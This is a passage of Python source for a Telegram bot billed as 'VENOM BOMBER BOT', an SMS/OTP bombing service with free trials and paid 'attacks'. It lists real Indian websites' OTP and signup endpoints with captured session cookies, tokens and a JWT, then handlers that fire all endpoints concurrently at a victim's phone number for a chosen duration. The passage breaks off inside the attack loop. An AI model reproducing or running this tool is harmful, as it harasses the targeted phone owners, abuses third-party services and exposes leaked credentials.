            "cookie": "cloudfront-viewer-address=60.243.56.169%3A50469; cloudfront-viewer-country=IN; cloudfront-viewer-latitude=12.89960; cloudfront-viewer-longitude=80.22090; headerFalse=false; isMobile=false; deviceType=web; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; _fbp=fb.1.1717523419577.584874862107093753; __zlcmid=1M6mlnN1oPHJHpz; _gcl_au=1.1.1317100846.1717523446; moe_uuid=066d95a8-7171-4415-bb99-8c3208dd358a; _gid=GA1.2.1017913527.1717523447; _gat_UA-46762303-1=1; nbDevice=desktop; mbTrackID=f80f8a7ed66e49bd94ecb36eb4ec1231; JSESSION=a00e843f-c089-4974-bf93-187b368b5fd6; _ga=GA1.2.1392560530.1717523447; _ga_BS11V183V6=GS1.1.1717523448.1.0.1717523449.0.0.0; SPRING_SECURITY_REMEMBER_ME_COOKIE=RE5nY1B6emFITDNROURiK3Q3bGUxZz09OmVhNHhhMmFtdGtYK3lCU0d3VVZFelE9PQ; nbccc=ce1dab2af6f44009bd5b52e763f82eb6; loggedInUserStatus=new; _f_au=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL2lkZW50aXR5dG9vbGtpdC5nb29nbGVhcGlzLmNvbS9nb29nbGUuaWRlbnRpdHkuaWRlbnRpdHl0b29sa2l0LnYxLklkZW50aXR5VG9vbGtpdCIsImV4cCI6MTcxNzUyNzA5NSwiaWF0IjoxNzE3NTIzNDk1LCJpc3MiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJzdWIiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJ1aWQiOiI4YTlmODVjMzhmZTQzNWFhMDE4ZmU0NjBiYWUwMGE1NCJ9.MrM3GFgrPEXnRagMOJDt6qUWkJDGts7uqpGV_o9fp9GHhyxYEnfwglMuc_tjA0wUFi79z376sLUIhVB8RsFHmueWEkxFRhaWcHXpj0CoiwYrKfY-h1PlxxwK6CiqFj0KXlcF21y_bulFwdBGtJzRY4vsYIdDpZI5eIv9wZip2e1i8aQXrHrcQNaZBcnI8a9kyelHeaSsQrkLKcX1ujan-beemsh4H0InDVLTGlYgXKgnQZlN5Ee5eZjlASbwYu7UdkHhanQN9XSJNqPyG2P7gGuN3Ma8z3_WXcslVcAzO0kJqozOAg3eyuqkPVttvliYZf4Hw5as-NbtXDI6mqvZ2A; _ud_check=true; _ud_basic=true; _ud_login=true; _ga_SQ9H8YK20V=GS1.1.1717523447.1.1.1717523496.11.0.502991464",
            "origin": "https://www.nobroker.in",
            "priority": "u=1, i",
            "referer": "https://www.nobroker.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sentry-trace": "5631cb3b0d6c45f7bbe6cad72d259956-8b4734b3007bc507",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"phone=%2B91{phone}",
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 3
    },
    
    {
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "vidyakul_selected_languages=eyJpdiI6ImF1QUVZTjlSaXlxWkVZeUVJT0puNFE9PSIsInZhbHVlIjoiM2UwTExVUmxnNGYyZW1jeEhZYmgyS1wvdEJIdmw1dzFwSnJZWUhGdmF6U009IiwibWFjIjoiOGM3NTBlYjQ1Y2JjODJjYmU1ZGY1Y2EyNTc4YWI0Mzc1YmRmYWRkZTY5Y2QzMjY3NjExOTRiMGVlMmVhMGU4MiJ9; _gcl_au=1.1.1032572450.1715943378; XSRF-TOKEN=eyJpdiI6IjViN3I2Q0h4aG02XC9TVjUwZjdkcklnPT0iLCJ2YWx1ZSI6InF4bDk0RHhMRHhjcVJsVTlPYnk4MHlWaGJcL210N2poZ3JpaldpdlQ1YVwvUTFsSFwvU2lTV1BERWNFTFR4eTJkUnVsclNxMzJUN3VoRjh0cWI4bjdWMEVBPT0iLCJtYWMiOiI3YzJmZGY5NTMzMGQ3MmMwZGExYTEwNDc1MTk3MzVkOTE4ODk1YmI3NTJiZjViNGRmYThiOGVlZGU2YWNmNzg5In0%3D; vidyakul_session=eyJpdiI6IjdHamVPRmNoY1NwS0QzaVJNTFpSZGc9PSIsInZhbHVlIjoiM2Uxc2lnQThTR0tObHBCbFo1Z01tS1kxejM2TjRQNEFlNGhzT05ieEpodzFURVBcL3lJU01oYlRcLzFuUDlmT3RVWTF3ZERJSlN1SSttWHpYazExNDJOUT09IiwibWFjIjoiYmY0NDU0ODMxZTcyZTM2NGFkZmExNmM0YjU3OTY4MmUxNTg5ODM0NWY0NTM1ZWFhODJhMGEyODY0ZTYxNDBjZCJ9; vidyakul_selected_stream=eyJpdiI6Inc3cHVkS05wRm1KTVBJVjhpWmRORlE9PSIsInZhbHVlIjoib3E1aHk0bWJMak9UZGs3NmtJQ0hOcXN0XC9Bdm16YmpUT1NOVFRjQ21QaGc9IiwibWFjIjoiMGNhYzBjMjQyN2E0NmY5NGRkYTQwZjlhOTE4ZDMxNzAyYzNiMmFlYWMxMTg5MzRkZWExY2I1NDA1MjQwMzM5MiJ9; initialTrafficSource=utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided); utmzzses=1; trustedsite_visit=1; WZRK_S_4WZ-K47-ZZ6Z=%7B%22p%22%3A1%7D; _hjSessionUser_2242206=eyJpZCI6IjYxZTE2NGEyLTc0ZDYtNTQ3NS04NDIyLTg0MTYwNDhmMDhhYSIsImNyZWF0ZWQiOjE3MTU5NDMzOTQ1ODksImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2242206=eyJpZCI6ImI0NGUwMmRkLTlhMjktNDJjMi1hMjA4LTdmYWE0NGFhNTYxYiIsImMiOjE3MTU5NDMzOTQ2MTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1715943395600.1219722189; _ga=GA1.2.2084879805.1715943396; _gid=GA1.2.840887730.1715943396; _gat_UA-106550841-2=1; _ga_53F4FQTTGN=GS1.2.1715943400.1.0.1715943400.60.0.0; ajs_anonymous_id=e2b40642-510a-4751-82ba-9f4a307f6488; mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22%24device_id%22%3A%20%2218f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22mpap%22%3A%20%5B%5D%7D",
            "origin": "https://vidyakul.com",
            "priority": "u=1, i",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"phone={phone}",
        "count": 3
    },
    
    {
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
        "count": 200
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=pnui9tc6o5q1upng9gj21d0dqvdna36a; _ga=GA1.1.926584566.1759828023; _gcl_au=1.1.105500372.1759828023; _fbp=fb.1.1759828025039.398634452552158052; _ga_EWGNR5NDJB=GS2.1.s1759828023$o1$g1$t1759828028$j55$l0$h0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 200
    }
]
# =============== ALL APIs END ===============

TOTAL_APIS = len(APIS)

ADMIN_USER_IDS = [1073815732]

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_USER_IDS

# =============== BOT FUNCTIONS ===============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user_id = update.effective_user.id
    
    # Get user's first name (clean it)
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # Get trial info
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist in database, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    welcome_text = f"""
╔════════════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER              ║
╚════════════════════════════════════════════╝

👤 USER INFO:
├─ Name: {clean_first_name}
├─ ID: {user_id}
├─ Username: @{username}

🎁 TRIAL STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ YES" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Status: {reason}

⚡ VENOM ATTACK FEATURES:
├─ Speed: Level 5 (VENOM MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}

📋 COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <number> <time> - Paid VENOM attack
├─ /speed <1-5> - Set speed (Paid users only)
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show help

⚠️ IMPORTANT TRIAL RULES:
├─ ✅ Trial available: ONE TIME ONLY
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access after use
├─ 💰 Contact admin for paid access only
└─ 👑 Admin: @Venompratap

💰 FOR FULL ACCESS:
Contact: @Venompratap

📡 STATUS: ✅ ONLINE | ⚡ READY FOR VENOM ATTACK
"""
    
    await update.message.reply_text(welcome_text)

async def mytrial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user's trial status"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status_emoji = "✅" if trial_allowed else "❌"
    status_text = "AVAILABLE" if trial_allowed else "NOT AVAILABLE"
    
    trial_status_text = f"""
╔═══════════════════════════════════════╗
║          🎁 YOUR TRIAL STATUS        ║
╚═══════════════════════════════════════╝

👤 USER INFORMATION:
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{username}

📊 TRIAL STATISTICS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial Used: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

🎯 CURRENT STATUS:
├─ Trial Status: {status_emoji} {status_text}
├─ Reason: {reason}
└─ Duration: 60 seconds (One-time only)

⚡ VENOM ATTACK INFO:
├─ Total APIs: {TOTAL_APIS}
├─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}
└─ Mode: VENOM ATTACK (Level 5)

⚠️ IMPORTANT NOTES:
"""
    
    if trial_allowed:
        trial_status_text += """
├─ ✅ You can use /trial <number> NOW
├─ ⏰ Trial lasts 60 seconds only
├─ 🔒 After trial, access will be PERMANENTLY BLOCKED
├─ ⚠️ This is ONE-TIME USE ONLY
└─ 💰 Contact admin for paid access
"""
    else:
        trial_status_text += """
├─ ❌ Trial NOT available
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
    
    await update.message.reply_text(trial_status_text)

async def trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle free trial command - ONE TIME USE ONLY"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # STRICT CHECK: First check database
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial - STRICT CHECK
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    if not trial_allowed:
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ❌ TRIAL DENIED  ║
╚═══════════════════════╝

Reason: {reason}

📊 YOUR TRIAL INFO:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ Yes" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

⚠️ IMPORTANT:
├─ Trial is ONE-TIME USE ONLY
├─ After use, it's PERMANENTLY BLOCKED
├─ No further trial access available
├─ Only paid access now

💰 Contact Admin for Full Access:
👑 @Venompratap
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            """
╔════════════════════════════════════╗
║        🎁 FREE VENOM TRIAL         ║
╚════════════════════════════════════╝

Usage: /trial <phone_number>

⚡ VENOM ATTACK FEATURES:
├─ Duration: 60 seconds (1 minute)
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire at once
├─ Limit: ONE TIME ONLY
└─ After trial: PERMANENTLY BLOCKED

Example: /trial 9876543210

⚠️ IMPORTANT RULES:
├─ ✅ Available: ONE TIME ONLY
├─ ❌ After use: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
        )
        return
    
    phone = context.args[0]
    
    # Validate phone number
    if not re.match(r'^\d{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid phone number!\n"
            "Must be exactly 10 digits (Indian number)."
        )
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═════════════════════════╗
║  ⚡ NO APIs CONFIGURED  ║
╚═════════════════════════╝

APIs are not configured yet.

Contact admin for support: @Venompratap
"""
        )
        return
    
    # IMMEDIATELY mark trial as used and BLOCK it
    await mark_trial_used(user_id)
    
    # Set speed to level 5 for VENOM attack
    VENOM_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, VENOM_settings)
    
    # Set VENOM attack parameters
    duration = 60  # 1 minute for trial
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize VENOM attack session
    context.user_data['attacking'] = True
    context.user_data['target_phone'] = phone
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = VENOM_settings
    context.user_data['is_trial_attack'] = True
    
    # Get updated trial info
    updated_trial_info = await get_user_trial_info(user_id)
    
    # Create initial VENOM attack message
    status_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 VENOM ATTACK STARTED     ║
╚═════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {duration} seconds (1 minute)
⚡ MODE: VENOM ATTACK (TRIAL)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

⚡ VENOM CONFIGURATION:
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10}

🎁 TRIAL INFORMATION:
├─ Trial Count: {updated_trial_info['trial_used_count']}
├─ Trial Status: ONE-TIME USE
├─ After This: PERMANENTLY BLOCKED
└─ Next Step: Contact admin for paid access

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After 60 seconds

⚠️ IMPORTANT:
This is your ONE-TIME FREE VENOM ATTACK!
After this, trial access will be PERMANENTLY BLOCKED.

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start VENOM ATTACK
    asyncio.create_task(run_VENOM_attack(update, context, phone, duration, VENOM_settings, is_trial=True))

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /attack command for VENOM ATTACK - Paid users only"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    # First check if user is paid user
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        # Check if trial is available
        trial_allowed, reason = await can_user_use_trial(user_id)
        
        if trial_allowed:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║ 🎁 USE TRIAL FIRST   ║
╚═══════════════════════╝

You have a ONE-TIME FREE TRIAL available!

Use your free trial first:
/trial <number>

⚠️ IMPORTANT:
├─ Trial: 60 seconds, ONE TIME ONLY
├─ After trial: PERMANENTLY BLOCKED
├─ Then contact admin for paid access
└─ Admin: @Venompratap
"""
            )
        else:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║  🔒 ACCESS DENIED    ║
╚═══════════════════════╝

You have used your ONE-TIME trial.

📊 YOUR STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: ✅ PERMANENTLY
├─ Paid User: ❌ No

💰 Contact Admin for Full Access:
👑 @Venompratap
⚠️ Trial access is PERMANENTLY BLOCKED.
Only paid access available now.
"""
            )
        return
    
    # Check if already attacking
    if context.user_data.get('attacking', False):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║⚡ ALREADY ATTACKING  ║
╚═══════════════════════╝

You already have an active attack.
Use /stop to stop it first.
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            """
╔══════════════════════════════════════╗
║        ⚡💥 VENOM ATTACK COMMAND    ║
╚══════════════════════════════════════╝

Usage: /attack <number> <duration>

⚡ VENOM ATTACK MODE:
├─ Speed: Maximum (Level 5)
├─ Strategy: All APIs fire at once
├─ Concurrency: 1000 parallel requests
└─ OTPs: Unlimited during attack

Examples:
├─ /attack 9876543210 30 - 30 seconds
├─ /attack 9876543210 120 - 2 minutes
└─ /attack 9876543210 1000000000000000- Unlimited

Limits:
├─ Minimum: 10 seconds
└─ Maximum: No limit 
"""
        )
        return
    
    phone = context.args[0]
    duration_str = context.args[1]
    
    # Validate phone number
    if not re.match(r'^\d{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid phone number!\n"
            "Must be exactly 10 digits (Indian number)."
        )
        return
    
    # Validate duration
    try:
        duration = int(duration_str)
        if duration < 10:
            await update.message.reply_text("❌ Duration must be at least 10 seconds.")
            return
        if duration > 1000000000000:
            await update.message.reply_text("❌ Bsdk aur kitne karega")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Must be a number (10-300).")
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═══════════════════════╗
║⚡ NO APIs CONFIGURED  ║
╚═══════════════════════╝

APIs are not configured yet.

Contact admin for support: @Venompratap
"""
        )
        return
    
    # Get user speed settings (force level 5 for VENOM attack)
    VENOM_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, VENOM_settings)
    
    # Calculate end time
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize VENOM attack session
    context.user_data['attacking'] = True
    context.user_data['target_phone'] = phone
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = VENOM_settings
    context.user_data['is_trial_attack'] = False
    
    # Create initial VENOM attack message
    status_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 VENOM ATTACK STARTED     ║
╚═════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {duration} seconds
⚡ MODE: VENOM ATTACK (PAID USER)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

👤 USER STATUS:
├─ Account Type: ✅ PAID USER
├─ Trial Status: ❌ BLOCKED (One-time used)
├─ Access: Unlimited attacks
└─ Admin: @Venompratap

⚡ VENOM CONFIGURATION:
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10}

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After {duration}s

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start VENOM ATTACK task
    asyncio.create_task(run_VENOM_attack(update, context, phone, duration, VENOM_settings, is_trial=False))

# =============== VENOM ATTACK FUNCTIONS ===============

async def VENOM_api_call(session: aiohttp.ClientSession, api: dict, phone: str, context: ContextTypes.DEFAULT_TYPE):
    """Call a single API for VENOM attack"""
    try:
        url = api['url'].format(phone=phone)
        data = api['data'](phone) if callable(api['data']) else api['data']
        
        start_time = time.time()
        
        if api['method'] == 'GET':
            async with session.get(url, headers=api.get('headers', {}), timeout=aiohttp.ClientTimeout(3)) as response:
                end_time = time.time()
                response_time = end_time - start_time
                success = response.status in [200, 201, 202, 204]
                return {
                    'api_name': api.get('name', 'Unknown'),
                    'success': success,
                    'status': response.status,
                    'response_time': response_time,
                    'error': None
                }
        elif api['method'] == 'POST':
            async with session.post(url, headers=api.get('headers', {}), data=data, timeout=aiohttp.ClientTimeout(3)) as response:
                end_time = time.time()
                response_time = end_time - start_time
                success = response.status in [200, 201, 202, 204]
                return {
                    'api_name': api.get('name', 'Unknown'),
                    'success': success,
                    'status': response.status,
                    'response_time': response_time,
                    'error': None
                }
    except asyncio.TimeoutError:
        return {
            'api_name': api.get('name', 'Unknown'),
            'success': False,
            'status': 0,
            'response_time': 3.0,
            'error': 'Timeout'
        }
    except Exception as e:
        return {
            'api_name': api.get('name', 'Unknown'),
            'success': False,
            'status': 0,
            'response_time': 0,
            'error': str(e)
        }

async def run_VENOM_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str, duration: int, speed_settings: dict, is_trial: bool = False):
    """Run VENOM ATTACK - All APIs at once with maximum speed"""
    chat_id = context.user_data.get('status_chat_id')
    message_id = context.user_data.get('status_message_id')
    attack_start = context.user_data.get('attack_start')
    
    # For VENOM attack, use maximum concurrency
    max_concurrent = 100
